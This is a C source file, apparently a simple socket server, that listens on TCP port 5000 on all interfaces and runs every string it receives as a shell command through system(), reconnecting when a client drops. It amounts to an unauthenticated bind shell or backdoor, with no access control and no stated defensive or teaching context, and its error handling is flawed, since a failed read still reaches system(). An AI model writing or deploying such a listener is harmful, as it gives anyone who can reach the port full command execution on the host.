//Server Side C program
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdbool.h>
#define PORT 5000



int main(int argc, char const* argv[])
{
	int server_fd, new_socket, valread;
	struct sockaddr_in address;
	int opt = 1;
	int addrlen = sizeof(address);
	char buffer[4095] = { 0 };

	// Creating socket file descriptor
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0))
		== 0) {
		perror("socket failed");
		exit(EXIT_FAILURE);
	}

	// Forcefully attaching socket to the port 5000
	if (setsockopt(server_fd, SOL_SOCKET,
				SO_REUSEADDR , &opt,
				sizeof(opt))) {
		//if (setsockopt(server_fd, SOL_SOCKET,SO_REUSEADDR | SO_REUSEPORT, &opt,sizeof(opt)))
		perror("setsockopt");
		exit(EXIT_FAILURE);
	}
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);

	// Forcefully attaching socket to the port 5000
	if (bind(server_fd, (struct sockaddr*)&address,
			sizeof(address))
		< 0) {
		perror("bind failed");
		exit(EXIT_FAILURE);
	}
	if (listen(server_fd, 3) < 0) {
		perror("listen");
		exit(EXIT_FAILURE);
	}
	if ((new_socket
		= accept(server_fd, (struct sockaddr*)&address,
				(socklen_t*)&addrlen))
		< 0) {
		perror("accept");
		exit(EXIT_FAILURE);
	}
	
	//printf("Client Accepted and connected to PORT %d\n" , PORT);
	while(true){
		valread = read(new_socket, buffer, 1024);
			
			if(valread!=0)
			{
			
			system(buffer);
			
			printf("\n");
			
			memset(buffer , 0 ,1024);
			
			}
			
			//To Check if server is disconnected
			else if(valread == -1 || valread == 0)
			{
			
			//Tries to reconnect
			close(new_socket);
			
			shutdown(server_fd, SHUT_RDWR);
			
			if ((server_fd = socket(AF_INET, SOCK_STREAM, 0))
			== 0) {
			perror("socket failed");
			exit(EXIT_FAILURE);
			}

			// Forcefully attaching socket to the port 5000
			if (setsockopt(server_fd, SOL_SOCKET,
						SO_REUSEADDR , &opt,
						sizeof(opt))) {
				//if (setsockopt(server_fd, SOL_SOCKET,SO_REUSEADDR | SO_REUSEPORT, &opt,sizeof(opt)))
				perror("setsockopt");
				exit(EXIT_FAILURE);
			}
			address.sin_family = AF_INET;
			address.sin_addr.s_addr = INADDR_ANY;
			address.sin_port = htons(PORT);

			// Forcefully attaching socket to the port 5000
			if (bind(server_fd, (struct sockaddr*)&address,
					sizeof(address))
				< 0) {
				perror("bind failed");
				exit(EXIT_FAILURE);
			}
			if (listen(server_fd, 3) < 0) {
				perror("listen");
				exit(EXIT_FAILURE);
			}
			if ((new_socket
				= accept(server_fd, (struct sockaddr*)&address,
						(socklen_t*)&addrlen))
				< 0) {
				perror("accept");
				exit(EXIT_FAILURE);
				
			}
			
			}
			
		
		}
		
		
		
	
	



	return 0;
}


